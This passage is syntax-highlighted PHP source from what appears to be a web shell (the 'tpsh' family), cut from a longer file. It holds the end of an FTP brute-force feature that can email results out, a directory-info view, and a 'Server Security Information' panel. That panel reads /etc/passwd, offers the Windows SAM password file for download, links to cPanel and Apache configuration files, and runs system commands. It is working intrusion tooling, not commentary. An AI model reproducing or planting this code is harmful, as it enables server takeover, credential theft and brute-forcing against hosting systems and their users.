          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&amp;lt;b&amp;gt;Done!&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;Total time (secs.): &quot;</span><span class="o">.</span><span class="nv">$ftpquick_t</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;Total connections: &quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;Success.: &amp;lt;font color=green&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$success</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;Unsuccess.:&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">-</span><span class="nv">$success</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;Connects per second: &quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nv">$i</span><span class="o">/</span><span class="nv">$ftpquick_t</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
          <span class="nv">$fqb_log</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">------------------------------------------</span><span class="se">\r\n</span><span class="s2">Done!</span><span class="se">\r\n</span><span class="s2">Total time (secs.): &quot;</span><span class="o">.</span><span class="nv">$ftpquick_t</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">Total connections: &quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">Success.: &quot;</span><span class="o">.</span><span class="nv">$success</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">Unsuccess.:&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">-</span><span class="nv">$success</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">Connects per second: &quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nv">$i</span><span class="o">/</span><span class="nv">$ftpquick_t</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">)</span> <span class="p">{</span><span class="nb">fseek</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$fqb_log</span><span class="p">));}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logemail</span><span class="p">)</span> <span class="p">{</span><span class="o">@</span><span class="nb">mail</span><span class="p">(</span><span class="nv">$fqb_logemail</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nv">$sh_name</span><span class="o">.</span><span class="s2">&quot; report&quot;</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">);}</span>
          <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">);</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$logfile</span> <span class="o">=</span> <span class="nv">$tmpdir_logs</span><span class="o">.</span><span class="s2">&quot;tpsh_ftpquickbrute_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y_H_i_s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.log&quot;</span><span class="p">;</span>
        <span class="nv">$logfile</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$logfile</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=act value=</span><span class="se">\&quot;</span><span class="s2">ftpquickbrute</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;Read first:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=text name=</span><span class="se">\&quot;</span><span class="s2">fqb_lenght</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$nixpwdperpage</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_onlywithsh</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt; Users only with shell&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_logging</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&amp;gt;Logging&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Logging to file:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_logfile</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$logfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">)</span><span class="o">/</span><span class="mi">10</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Logging to e-mail:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_logemail</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$log_email</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logemail</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logemail</span><span class="p">)</span><span class="o">/</span><span class="mi">10</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td colspan=2&amp;gt;&amp;lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Brute</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;</span><span class="si">$d</span><span class="s2"> is a not a Directory!&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Directory information:&amp;lt;/b&amp;gt;&amp;lt;table border=0 cellspacing=1 cellpadding=2&amp;gt;&quot;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Owner/Group&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="p">;</span>
          <span class="nv">$ow</span> <span class="o">=</span> <span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
          <span class="nv">$gr</span> <span class="o">=</span> <span class="nb">posix_getgrgid</span><span class="p">(</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
          <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$ow</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">?</span><span class="nv">$ow</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">:</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$gr</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">?</span><span class="nv">$gr</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">:</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Perms&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=chmod&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Create time&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">filectime</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Access time&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">fileatime</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;MODIFY time&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;phpinfo&quot;</span><span class="p">)</span> <span class="p">{</span><span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nb">phpinfo</span><span class="p">();</span> <span class="nx">tpshexit</span><span class="p">();}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;security&quot;</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=barheader&amp;gt;.: Server Security Information :.&amp;lt;/div&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;table&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Open Base Dir&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$hopenbasedir</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;Password File&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$nixpasswd</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$nixpasswd</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span><span class="nv">$nixpasswd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
          <span class="k">echo</span> <span class="s2">&quot;*nix /etc/passwd:&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$nixpwd_s</span><span class="p">))</span> <span class="p">{</span><span class="nv">$nixpwd_s</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$nixpwd_e</span><span class="p">))</span> <span class="p">{</span><span class="nv">$nixpwd_e</span> <span class="o">=</span> <span class="nv">$nixpwdperpage</span><span class="p">;}</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=act value=</span><span class="se">\&quot;</span><span class="s2">security</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=</span><span class="se">\&quot;</span><span class="s2">nixpasswd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;From:&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text=</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">nixpwd_s</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$nixpwd_s</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;b&amp;gt;To:&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">nixpwd_e</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$nixpwd_e</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;input type=submit value=</span><span class="se">\&quot;</span><span class="s2">View</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
          <span class="nv">$i</span> <span class="o">=</span> <span class="nv">$nixpwd_s</span><span class="p">;</span>
          <span class="k">while</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$nixpwd_e</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$uid</span> <span class="o">=</span> <span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$uid</span><span class="p">)</span> <span class="p">{</span>
              <span class="nv">$uid</span><span class="p">[</span><span class="s2">&quot;dir&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$uid</span><span class="p">[</span><span class="s2">&quot;dir&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$uid</span><span class="p">[</span><span class="s2">&quot;dir&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
              <span class="k">echo</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span><span class="nv">$uid</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=security&amp;nixpasswd=1&amp;d=&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;Download /etc/passwd&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;WINDIR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r</span><span class="s2">epair\sam&quot;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=sam&amp;d=&quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;WINDIR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">repair&amp;ft=download</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;Download password file&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Config Files&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;User Domains&quot;</span><span class="p">,</span><span class="s2">&quot;/etc/userdomains&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Cpanel Config&quot;</span><span class="p">,</span><span class="s2">&quot;/var/cpanel/accounting.log&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Apache Config&quot;</span><span class="p">,</span><span class="s2">&quot;/usr/local/apache/conf/httpd.conf&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Apache Config&quot;</span><span class="p">,</span><span class="s2">&quot;/etc/httpd.conf&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Syslog Config&quot;</span><span class="p">,</span><span class="s2">&quot;/etc/syslog.conf&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Message of The Day&quot;</span><span class="p">,</span><span class="s2">&quot;/etc/motd&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Hosts&quot;</span><span class="p">,</span><span class="s2">&quot;/etc/hosts&quot;</span><span class="p">)</span>
        <span class="p">);</span>
        <span class="nv">$sep</span> <span class="o">=</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$windir</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;WINDIR&quot;</span><span class="p">];</span>
        <span class="nv">$etcdir</span> <span class="o">=</span> <span class="nv">$windir</span> <span class="o">.</span> <span class="s2">&quot;\system32\drivers\etc</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Hosts&quot;</span><span class="p">,</span><span class="nv">$etcdir</span><span class="o">.</span><span class="s2">&quot;hosts&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;Local Network Map&quot;</span><span class="p">,</span><span class="nv">$etcdir</span><span class="o">.</span><span class="s2">&quot;networks&quot;</span><span class="p">),</span>
            <span class="k">array</span><span class="p">(</span><span class="s2">&quot;LM Hosts&quot;</span><span class="p">,</span><span class="nv">$etcdir</span><span class="o">.</span><span class="s2">&quot;lmhosts.sam&quot;</span><span class="p">),</span>
        <span class="p">);</span>
        <span class="nv">$sep</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">foreach</span> <span class="p">(</span><span class="nv">$v</span> <span class="k">as</span> <span class="nv">$sec_arr</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$sec_f</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">strrchr</span><span class="p">(</span><span class="nv">$sec_arr</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$sep</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
        <span class="nv">$sec_d</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nv">$sec_arr</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="nv">$sec_f</span><span class="p">);</span>
        <span class="nv">$sec_full</span> <span class="o">=</span> <span class="nv">$sec_d</span><span class="o">.</span><span class="nv">$sec_f</span><span class="p">;</span>
        <span class="nv">$sec_d</span> <span class="o">=</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nv">$sec_d</span><span class="p">,</span><span class="nv">$sep</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$sec_full</span><span class="p">))</span> <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot; [ &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=</span><span class="si">$sec_f</span><span class="s2">&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sec_d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;ft=txt</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$sec_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt; ] </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
     
      <span class="k">function</span> <span class="nf">displaysecinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;pre&amp;gt;&quot;</span><span class="o">.</span><span class="nb">wordwrap</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/pre&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;OS Version&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;cat /proc/version&quot;</span><span class="p">));</span>
        <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Kernel Version&quot;</span><span class="p">,</span><span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;sysctl -a | grep version&quot;</span><span class="p">));</span>
